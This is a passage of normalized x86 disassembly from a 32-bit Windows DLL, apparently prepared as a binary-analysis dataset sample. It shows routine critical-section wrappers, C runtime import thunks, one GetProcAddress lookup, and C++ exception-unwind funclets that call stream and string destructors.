lea eax [ eax + eax * 2 + 0x6 ]
push [ ecx + eax * 4 ]
lea esi [ ecx + eax * 4 ]
mov eax [ ecx + 0xc ]
call [ eax + 0x40 ]
and [ esi ] 0x0
pop esi
retn 0x4
sub_1000487f
mov eax [ ecx + 0x4 ]
retn
sub_10004aa9
push esi
mov esi ecx
push 0xcc
push 0x0
push esi
call memset
add esp 0xc
mov eax esi
pop esi
retn
sub_10004ac0
retn
sub_10004be0
mov eax ecx
retn
sub_10005072
push esi
mov esi ecx
push esi
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
sub_10005080
push ecx
call [ DeleteCriticalSection@IAT ]
retn
sub_10005088
push ecx
call [ EnterCriticalSection@IAT ]
retn
sub_10005090
push ecx
call [ LeaveCriticalSection@IAT ]
retn
sub_10005098
mov eax ecx
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
retn
sub_100050a2
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
retn
push 0x0
call [ free@IAT ]
pop ecx
sub_10005263
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
pop esi
retn
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esi ] eax
sub_10005550
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_1000556c
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
strlen
jmp [ strlen@IAT ]
memcpy
jmp [ memcpy@IAT ]
memset
jmp [ memset@IAT ]
strcpy
jmp [ strcpy@IAT ]
strcat
jmp [ strcat@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
sub_100055c0
mov eax [ ebp - 0x110 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_100055ce
mov eax r--data
jmp __CxxFrameHandler
sub_100055e0
mov eax r--data
jmp __CxxFrameHandler
sub_100055f0
mov eax [ ebp - 0x22b4 ]
and eax 0x1
test eax eax
je r-xdata
retn
lea ecx [ ebp - 0x224c ]
jmp [ std::basic_ios<char,struct std::char_traits<char> >::~basic_ios<char,struct std::char_traits<char> >@IAT ]
sub_1000560e
lea ecx [ ebp - 0x22a0 ]
jmp [ std::basic_iostream<char,struct std::char_traits<char> >::~basic_iostream<char,struct std::char_traits<char> >@IAT ]
sub_1000561a
mov ecx [ ebp - 0x22b8 ]
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::~basic_streambuf<char,struct std::char_traits<char> >@IAT ]
sub_10005626
mov ecx [ ebp - 0x22b8 ]
add ecx 0x4c
jmp [ std::locale::~locale@IAT ]
sub_10005635
lea ecx [ ebp - 0x22a0 ]
jmp [ std::basic_filebuf<char,struct std::char_traits<char> >::~basic_filebuf<char,struct std::char_traits<char> >@IAT ]
sub_10005641
lea ecx [ ebp - 0x22ac ]
jmp [ std::basic_fstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
sub_1000564d
mov ecx [ ebp - 0x22b4 ]
sub ecx 0x54
jmp [ std::basic_iostream<char,struct std::char_traits<char> >::~basic_iostream<char,struct std::char_traits<char> >@IAT ]
sub_1000565c
mov ecx [ ebp - 0x22b0 ]
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::~basic_streambuf<char,struct std::char_traits<char> >@IAT ]
sub_10005668
mov ecx [ ebp - 0x22b0 ]
add ecx 0x4c
jmp [ std::locale::~locale@IAT ]
sub_10005677
mov eax r--data
jmp __CxxFrameHandler
sub_10005690
lea ecx [ ebp - 0x2018 ]
jmp sub_100050a2
sub_1000569b
mov eax r--data
jmp __CxxFrameHandler
sub_100056b0
lea ecx [ ebp - 0x21c ]
jmp sub_100050a2
sub_100056bb
mov eax r--data
jmp __CxxFrameHandler
sub_100056c8
mov eax r--data
jmp __CxxFrameHandler
sub_100056d4
lea ecx [ ebp - 0x48 ]
jmp sub_100047c6
sub_100056dc
push [ ebp - 0x18 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100056e6
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100056f0
mov eax r--data
jmp __CxxFrameHandler
sub_100056fc
lea ecx [ ebp + 0x8 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_10005705
mov eax r--data
jmp __CxxFrameHandler
sub_10005710
lea ecx [ ebp + 0x8 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_10005719
mov eax r--data
jmp __CxxFrameHandler
sub_10005724
lea ecx [ ebp + 0x8 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_1000572d
mov eax r--data
jmp __CxxFrameHandler
sub_10005738
lea ecx [ ebp - 0x3c ]
jmp sub_100047fa
sub_10005740
lea ecx [ ebp - 0x5c ]
jmp sub_100047c6
sub_10005748
push [ ebp + 0x8 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005752
push [ ebp + 0x8 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000575c
push [ ebp + 0x8 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005766
mov eax r--data
jmp __CxxFrameHandler
sub_10005770
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000577a
mov eax r--data
jmp __CxxFrameHandler
sub_10005784
lea ecx [ ebp - 0x4c ]
jmp sub_100047c6
sub_1000578c
push [ ebp - 0x1c ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005796
push [ ebp - 0x20 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100057a0
push [ ebp - 0x20 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100057aa
mov eax r--data
jmp __CxxFrameHandler
sub_100057b4
lea ecx [ ebp - 0x6c ]
jmp sub_10004820
sub_100057bc
push [ ebp + 0x8 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100057c6
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100057d0
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100057da
mov eax r--data
jmp __CxxFrameHandler
sub_100057e4
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100057ee
lea ecx [ ebp - 0x68 ]
jmp sub_10004820
sub_100057f6
push [ ebp - 0x18 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005800
push [ ebp - 0x18 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000580a
mov eax r--data
jmp __CxxFrameHandler
sub_10005814
push [ ebp - 0x1c ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000581e
push [ ebp - 0x1c ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005828
mov eax r--data
jmp __CxxFrameHandler
sub_10005834
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000583e
mov eax r--data
jmp __CxxFrameHandler
